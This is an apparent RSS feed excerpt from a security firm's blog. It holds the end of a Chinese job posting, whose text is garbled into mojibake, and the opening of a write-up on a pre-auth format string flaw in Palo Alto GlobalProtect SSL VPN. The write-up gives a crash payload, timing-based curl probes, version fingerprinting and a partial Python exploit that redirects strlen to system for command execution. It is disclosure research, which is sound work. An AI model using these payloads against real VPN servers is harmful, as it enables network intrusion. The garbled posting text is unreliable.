  &lt;li&gt;æ‚¨æ˜¯ MAC ä½¿ç”¨è€…&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨æœªä¾†çš„é›»è…¦æœƒæ˜¯ MACï¼Œæˆ‘å€‘å¸Œæœ›æ‚¨è¶Šå¿«é †æš¢ä½¿ç”¨é›»è…¦è¶Šå¥½ã€‚&lt;/font&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æ˜¯ç”Ÿæ´»é§­å®¢&lt;br /&gt;&lt;font color=&quot;#8c8c8c&quot;&gt;æ‚¨ä¸éœ€è¦æœƒå¯«ç¨‹å¼ï¼Œä½†æ‚¨ç¿’æ…£è§€å¯Ÿç”Ÿæ´»ä¸­çš„è¦å¾‹ï¼Œä¸¦æƒ³è¾¦æ³•åˆ©ç”¨é€™äº›è¦å¾‹æœ‰æ•ˆç‡çš„è§£æ±ºå•é¡Œã€‚&lt;/font&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å·¥ä½œç’°å¢ƒ&quot;&gt;å·¥ä½œç’°å¢ƒ&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;æ‚¨æœƒåœ¨ä¸€å€‹é–‹é—Šçš„è¾¦å…¬ç’°å¢ƒå·¥ä½œ
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_2.jpg&quot; alt=&quot;DEVCORE ENV&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ‚¨æœƒæ“æœ‰ä¸€å¼µ Aeron äººé«”å·¥å­¸æ¤…
&lt;img src=&quot;/assets/img/blog/20150819/devcore_aeron.jpg&quot; alt=&quot;DEVCORE AERON&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;æ¯é€±è£œæ»¿é£²æ–™ï¼ˆå¦æœ‰å’–å•¡æ©Ÿï¼‰ã€é›¶é£Ÿï¼Œè®“æ‚¨ä¿æŒå¿ƒæƒ…æ„‰å¿«
&lt;img src=&quot;/assets/img/blog/20150819/devcore_office_3.jpg&quot; alt=&quot;DEVCORE DRINK&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;å…¬å¸æä¾›é£›é¢æ©Ÿè®“æ‚¨ç™¼æ´©å°ä¸»ç®¡çš„æ€¨æ°£
&lt;img src=&quot;/assets/img/blog/20150819/devcore_dart.jpg&quot; alt=&quot;DEVCORE DART&quot; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å…¬å¸ç¦åˆ©&quot;&gt;å…¬å¸ç¦åˆ©&lt;/h3&gt;
&lt;p&gt;æˆ‘å€‘æ³¨é‡å…¬å¸æ¯ä½åŒä»çš„èº«å¿ƒå¥åº·ï¼Œè«‹åƒè€ƒä»¥ä¸‹ç¦åˆ©åˆ¶åº¦ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ä¼‘å‡ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;åˆ°è·å³å¯é æ”¯ç•¶å¹´åº¦ç‰¹ä¼‘&lt;/li&gt;
      &lt;li&gt;æ¯å¹´äº”å¤©å…¨è–ªç—…å‡&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;çé‡‘ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;ä¸‰ç¯€ç¦®é‡‘ï¼ˆæ˜¥ç¯€ã€ç«¯åˆç¯€ã€ä¸­ç§‹ç¯€ï¼‰&lt;/li&gt;
      &lt;li&gt;ç”Ÿæ—¥ç¦®é‡‘&lt;/li&gt;
      &lt;li&gt;å©šå–ªè£œåŠ©&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ä¼‘é–’ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥æ—…éŠ&lt;/li&gt;
      &lt;li&gt;èˆ’å£“æŒ‰æ‘©&lt;/li&gt;
      &lt;li&gt;Team Building&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ç¾é£Ÿç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;é›¶é£Ÿé£²æ–™&lt;/li&gt;
      &lt;li&gt;å“¡å·¥èšé¤&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å¥åº·ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å“¡å·¥å¥åº·æª¢æŸ¥&lt;/li&gt;
      &lt;li&gt;é‹å‹•ä¸­å¿ƒå¥èº«åˆ¸&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;é€²ä¿®ç¦åˆ©
    &lt;ul&gt;
      &lt;li&gt;å…§éƒ¨æ•™è‚²è¨“ç·´&lt;/li&gt;
      &lt;li&gt;å¤–éƒ¨é€²ä¿®èª²ç¨‹&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;å…¶ä»–
    &lt;ul&gt;
      &lt;li&gt;å°ˆæ¥­çš„å…¬å¸åœ˜éšŠ&lt;/li&gt;
      &lt;li&gt;æ‰å¹³çš„å…§éƒ¨çµ„ç¹”&lt;/li&gt;
      &lt;li&gt;é †æš¢çš„æºé€šæ°›åœ&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;èµ·è–ªç¯„åœ&quot;&gt;èµ·è–ªç¯„åœ&lt;/h3&gt;
&lt;p&gt;æ–°å°å¹£ 34,000 - 40,000 ï¼ˆä¿è­‰å¹´è–ª 14 å€‹æœˆï¼‰&lt;/p&gt;

&lt;h3 id=&quot;æ‡‰å¾µæ–¹å¼&quot;&gt;æ‡‰å¾µæ–¹å¼&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;è«‹å°‡æ‚¨çš„å±¥æ­·ä»¥ PDF æ ¼å¼å¯„åˆ°Â recruiting@devco.re
    &lt;ul&gt;
      &lt;li&gt;å±¥æ­·æ ¼å¼è«‹åƒè€ƒç¯„ä¾‹ç¤ºæ„ï¼ˆ&lt;a href=&quot;/assets/files/recruit/Resume_Example.docx&quot;&gt;DOC&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pages&quot;&gt;PAGES&lt;/a&gt;ã€&lt;a href=&quot;/assets/files/recruit/Resume_Example.pdf&quot;&gt;PDF&lt;/a&gt;ï¼‰ä¸¦è½‰æˆ PDFã€‚è‹¥æ‚¨æœ‰è‡ªä¿¡ï¼Œä¹Ÿå¯ä»¥è‡ªç”±ç™¼æ®æœ€èƒ½å‘ˆç¾æ‚¨èƒ½åŠ›çš„å±¥æ­·ã€‚&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;æ¨™é¡Œæ ¼å¼ï¼š&lt;strong&gt;[æ‡‰å¾µ] è¡Œæ”¿å°ˆå“¡ æ‚¨çš„å§“å&lt;/strong&gt;ï¼ˆç¯„ä¾‹ï¼š[æ‡‰å¾µ] è¡Œæ”¿å°ˆå“¡ ç‹å°ç¾ï¼‰&lt;/li&gt;
  &lt;li&gt;å±¥æ­·å…§å®¹è«‹å‹™å¿…æ§åˆ¶åœ¨å…©é ä»¥å…§ï¼Œè‡³å°‘éœ€åŒ…å«ä»¥ä¸‹å…§å®¹ï¼š
    &lt;ul&gt;
      &lt;li&gt;åŸºæœ¬è³‡æ–™&lt;/li&gt;
      &lt;li&gt;å­¸æ­·&lt;/li&gt;
      &lt;li&gt;å·¥ä½œç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç¤¾ç¾¤æ´»å‹•ç¶“æ­·&lt;/li&gt;
      &lt;li&gt;ç‰¹æ®Šäº‹è¹Ÿ&lt;/li&gt;
      &lt;li&gt;MBTI è·æ¥­æ€§æ ¼æ¸¬è©¦çµæœï¼ˆ&lt;a href=&quot;https://www.apesk.com/mbti/dati_tw.asp&quot;&gt;æ¸¬è©¦ç¶²é &lt;/a&gt;ï¼‰&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;é™„è¨»&quot;&gt;é™„è¨»&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘æœƒåœ¨å…©é€±å…§ä¸»å‹•èˆ‡æ‚¨è¯ç¹«ï¼Œæ‹›å‹Ÿéç¨‹ä¾åºç‚ºæ›¸é¢å¯©æ ¸ã€ç·šä¸Šæ¸¬é©—ä»¥åŠé¢è©¦ä¸‰å€‹éšæ®µã€‚æœ€å¿«å°‡æ–¼å…«æœˆä¸­é€²è¡Œç¬¬äºŒéšæ®µçš„ç·šä¸Šæ¸¬é©—ï¼Œç…©è«‹è€å¿ƒç­‰å€™ã€‚
ç”±æ–¼æœ€è¿‘æ¥­å‹™è¼ƒç‚ºå¿™ç¢Œï¼Œè‹¥æœ‰æ‡‰å¾µç›¸é—œå•é¡Œï¼Œè«‹ä¸€å¾‹ä½¿ç”¨ Email è¯ç¹«ï¼Œé€ æˆæ‚¨çš„ä¸ä¾¿è«‹è¦‹è«’ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘é¸æ“‡å„ªå…ˆåœ¨éƒ¨è½æ ¼å…¬å¸ƒå¾µæ‰è³‡è¨Šï¼Œæ˜¯å¸Œæœ›æ‚¨ä¹Ÿå°è³‡è¨Šå®‰å…¨è­°é¡Œæ„Ÿèˆˆè¶£ï¼Œå³ä½¿ä¸æ‡‚æŠ€è¡“ä¹Ÿæƒ³ç‚ºå°ç£è³‡å®‰ç›¡ä¸€é»åŠ›ã€‚ç„¡è«–å¦‚ä½•ï¼Œæˆ‘å€‘éƒ½æ„Ÿè¬æ‚¨çš„ä¾†ä¿¡ï¼ŒæœŸå¾…æ‚¨çš„åŠ å…¥ï¼&lt;/p&gt;

</description>
                <link>https://devco.re/blog/2019/07/23/devcore-201907-recruit/</link>
                <guid>https://devco.re/blog/2019/07/23/devcore-201907-recruit</guid>
                <pubDate>Tue, 23 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;SSL VPNs protect corporate assets from Internet exposure, but what if SSL VPNs themselves are vulnerable? Theyâ€™re exposed to the Internet, trusted to reliably guard the only way to your intranet. Once the SSL VPN server is compromised, attackers can infiltrate your Intranet and even take over all users connecting to the SSL VPN server! Due to its importance, in the past several months, we started a new research on the security of leading SSL VPN products.&lt;/p&gt;

&lt;p&gt;We plan to publish our results on 3 articles. We put this as the first one because we think this is an interesting story and is very suitable as an appetizer of our &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; and &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; talk:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt;!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Donâ€™t worry about the spoilers, this story is not included in our BHUSA/DEFCON talks.&lt;/p&gt;

&lt;p&gt;In our incoming presentations, we will provide more hard-core exploitations and crazy bugs chains to hack into your SSL VPN. From how we jailbreak the appliance and what attack vectors we are focusing on. We will also demonstrate gaining root shell from the only exposed HTTPS port, covertly weaponizing the server against their owner, and abusing a hidden feature to take over all VPN clients! So please look forward to it ;)&lt;/p&gt;

&lt;h2 id=&quot;the-story&quot;&gt;The story&lt;/h2&gt;

&lt;p&gt;In this article, we would like to talk about the vulnerability on Palo Alto SSL VPN. Palo Alto calls their SSL VPN product line as GlobalProtect. You can easily identify the GlobalPortect service via the 302 redirection to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/login.esp&lt;/code&gt; on web root!&lt;/p&gt;

&lt;p&gt;About the vulnerability, we accidentally discovered it during our &lt;a href=&quot;https://devco.re/en/services/red-team/&quot;&gt;Red Team assessment services&lt;/a&gt;.  At first, we thought this is a 0day. However, we failed reproducing on the remote server which is the latest version of GlobalProtect. So we began to suspect if this is a known vulnerability.&lt;/p&gt;

&lt;p&gt;We searched all over the Internet, but we could not find anything. There is no public RCE exploit before[1], no official advisory contains anything similar and no CVE. So we believe this must be a silent-fix 1-day!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] There are some exploit about the  Pan-OS management interface before such as the &lt;a href=&quot;https://www.exploit-db.com/exploits/43342&quot;&gt;CVE-2017-15944&lt;/a&gt; and the excellent &lt;a href=&quot;https://www.troopers.de/events/troopers16/630_attacking_next-generation_firewalls/&quot;&gt;Troppers16 paper&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/_fel1x&quot;&gt;@_fel1x&lt;/a&gt;, but unfortunately, they are not talking about the GlobalProtect and the management interface is only exposed to the LAN port&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-bug&quot;&gt;The bug&lt;/h2&gt;

&lt;p&gt;The bug is very straightforward. It is just a simple format string vulnerability with no authentication required! The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; is the SSL gateway handling the SSL handshake between the server and clients. The daemon is exposed by the Nginx reverse proxy and can be touched via the path &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/sslmgr&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
        &amp;lt;clientcert-response&amp;gt;
                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
        &amp;lt;/clientcert-response&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;

scep-profile-name=%n%n%n%n%n...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;

&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;

&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we canâ€™t obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;

&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%9999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%99999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%999999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, itâ€™s still improper to crash a service!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;

&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&apos;%70$n&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%32$hn&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%24$hn&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;$p&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
